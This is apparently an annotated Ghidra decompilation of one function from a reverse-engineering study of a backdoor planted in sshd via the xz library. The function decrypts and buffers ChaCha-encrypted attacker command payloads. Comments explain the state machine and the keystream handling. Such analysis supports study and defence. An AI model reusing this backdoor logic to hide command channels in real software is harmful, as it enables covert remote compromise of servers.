// /home/kali/xzre-ghidra/xzregh/108D50_decrypt_payload_message.c
// Function: decrypt_payload_message @ 0x108D50
// Calling convention: __stdcall
// Prototype: BOOL __stdcall decrypt_payload_message(key_payload_t * payload, size_t payload_size, global_context_t * ctx)


/*
 * AutoDoc: Decrypts a ChaCha-wrapped `key_payload_t` chunk using the attacker-provided key material returned by
 * `secret_data_get_decrypted`. If the header/body lengths are sane and there is enough space left in `ctx->payload_buffer`,
 * it copies the plaintext body into the staging buffer, bumps `payload_bytes_buffered`, and then replays the decryption a
 * second time so the ChaCha keystream stays aligned with sshd's original consumer. Any failure (bad lengths, short
 * decrypts, exhausted buffer) forces `payload_state` back to PAYLOAD_STREAM_POISONED so future packets start from a clean slate.
 */

#include "xzre_types.h"

BOOL decrypt_payload_message(key_payload_t *payload,size_t payload_size,global_context_t *ctx)

{
  u64 buffered_payload_bytes;
  u8 *payload_buffer_cursor;
  BOOL decrypt_success;
  ulong body_copy_idx;
  long stack_wipe_rounds;
  size_t plaintext_body_len;
  u16 *ciphertext_cursor;
  int inl;
  u8 secret_data_seed [57];
  size_t payload_header_span;
  backdoor_payload_hdr_t hdr;
  u8 *payload_keystream_seed;
  u8 stack_padding_byte;
  u16 body_length_stub;
  
  payload_keystream_seed = (u8 *)0x0;
  stack_padding_byte = 0;
  ciphertext_cursor = &body_length_stub;
  for (stack_wipe_rounds = 0x29; stack_wipe_rounds != 0; stack_wipe_rounds = stack_wipe_rounds + -1) {
    *(u8 *)ciphertext_cursor = 0;
    ciphertext_cursor = (u16 *)((long)ciphertext_cursor + 1);
  }
  if (payload == (key_payload_t *)0x0) {
    if (ctx == (global_context_t *)0x0) {
      return FALSE;
    }
  }
  else {
    if (ctx == (global_context_t *)0x0) {
      return FALSE;
    }
    // AutoDoc: State 3 marks that sshd already consumed the payload buffer, so redundant decrypt requests short-circuit immediately.
    if (ctx->payload_state == PAYLOAD_STREAM_COMMAND_READY) {
      return TRUE;
    }
    if ((0x12 < payload_size) && ((uint)ctx->payload_state < 2)) {
      // AutoDoc: Stage the plaintext stride/index/bias header locally so ChaCha reuses the exact nonce sshd derived from the modulus chunk.
      *(u64 *)&hdr.field0_0x0 = *(u64 *)&payload->field0_0x0;
      hdr.field0_0x0.field1.cmd_type_bias = *(int64_t *)((long)&payload->field0_0x0 + 8);
      // AutoDoc: Recover the ChaCha key/IV pair from the encrypted secret blob before touching the ciphertext.
      decrypt_success = secret_data_get_decrypted((u8 *)&payload_keystream_seed,ctx);
      if (decrypt_success != FALSE) {
        // AutoDoc: Point the decrypt cursor at the 2-byte length + ciphertext payload so the first ChaCha pass exposes the plaintext size in place.
        ciphertext_cursor = &(payload->field0_0x0).field1.encrypted_body_length;
        inl = (int)payload_size + -0x10;
        // AutoDoc: First pass decrypts the header/trailer in place so the claimed body length can be validated.
        decrypt_success = chacha_decrypt((u8 *)ciphertext_cursor,inl,(u8 *)&payload_keystream_seed,(u8 *)&hdr,
                               (u8 *)ciphertext_cursor,ctx->imported_funcs);
        if (((decrypt_success != FALSE) &&
            (plaintext_body_len = (ulong)(payload->field0_0x0).field1.encrypted_body_length,
            // AutoDoc: Reject lengths that claim more plaintext than the ciphertext can hold once the 16-byte header and 2-byte size prefix are removed.
            plaintext_body_len <= payload_size - 0x12)) &&
           // AutoDoc: Make sure the staging buffer still has capacity before appending another decrypted chunk.
           (buffered_payload_bytes = ctx->payload_bytes_buffered, plaintext_body_len < ctx->payload_buffer_size - buffered_payload_bytes)) {
          payload_buffer_cursor = ctx->payload_buffer;
          // AutoDoc: Copy the plaintext body directly into `ctx->payload_buffer`, preserving the stream order.
          for (body_copy_idx = 0; plaintext_body_len != body_copy_idx; body_copy_idx = body_copy_idx + 1) {
            payload_buffer_cursor[body_copy_idx + buffered_payload_bytes] = *(u8 *)((long)&payload->field0_0x0 + body_copy_idx + 0x12);
          }
          ctx->payload_bytes_buffered = ctx->payload_bytes_buffered + plaintext_body_len;
          // AutoDoc: Re-run the decrypt so ChaCha’s keystream pointer stays aligned with sshd’s original consumer.
          decrypt_success = chacha_decrypt((u8 *)ciphertext_cursor,inl,(u8 *)&payload_keystream_seed,(u8 *)&hdr,
                                 (u8 *)ciphertext_cursor,ctx->imported_funcs);
          if (decrypt_success != FALSE) {
            return TRUE;
          }
        }
      }
    }
  }
  // AutoDoc: Any validation failure poisons the state machine so the caller restarts the stream from scratch.
  ctx->payload_state = PAYLOAD_STREAM_POISONED;
  return FALSE;
}

